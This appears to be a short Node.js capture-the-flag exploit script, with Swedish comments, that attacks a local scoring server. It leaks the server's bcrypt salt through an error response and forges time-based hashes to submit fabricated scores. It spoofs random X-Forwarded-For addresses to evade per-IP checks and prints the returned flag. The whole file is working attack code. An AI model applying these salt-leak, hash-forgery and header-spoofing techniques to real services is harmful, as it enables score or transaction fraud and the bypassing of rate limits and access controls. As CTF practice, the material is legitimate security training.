const axios = require('axios').default;
const bcrypt = require('bcrypt');

const ID = makeid(16);

// Hash funktionen som använder bcrypt i grunden och en salt vilket baseras på antalet 10 sekunder från unix epoch
async function stringToHash(input, serverSalt) {
  const salt = `$2b$10$${(serverSalt + Buffer.from((~~(new Date().getTime() / 1000)).toString() + (~~(new Date().getTime() / 1000)).toString()).toString('base64')).substring(0, 22)}`;
  return await bcrypt.hash(input, salt);
}

// för att kunna generera ett random IP för att spoofa
function generateIP() {
  return Math.floor(Math.random() * 255) + 1 + '.' + (Math.floor(Math.random() * 255) + 0) + '.' + (Math.floor(Math.random() * 255) + 0) + '.' + (Math.floor(Math.random() * 255) + 0);
}

// en funktion att generera id
function makeid(length) {
  var result = '';
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

(async function() {
  const res = await axios
    .post('http://localhost:6969/api/hash', {
      input: ['digitalungdom'],
    })
    .catch(function(error) {
      return error;
    });

  const SALT = res.response.data.substring(32, 54);

  for (let i = 0; i < 11; i++) {
    const res = await axios.post(
      'http://localhost:6969/api/get/flag',
      {
        id: ID,
        hash: await stringToHash(ID + i.toString(), SALT),
        score: i,
      },
      {
        headers: { 'X-Forwarded-For': generateIP() },
      },
    );

    console.log(i);

    if (res.status === 200) {
      console.log(res.data.flag);
    }
  }
})();
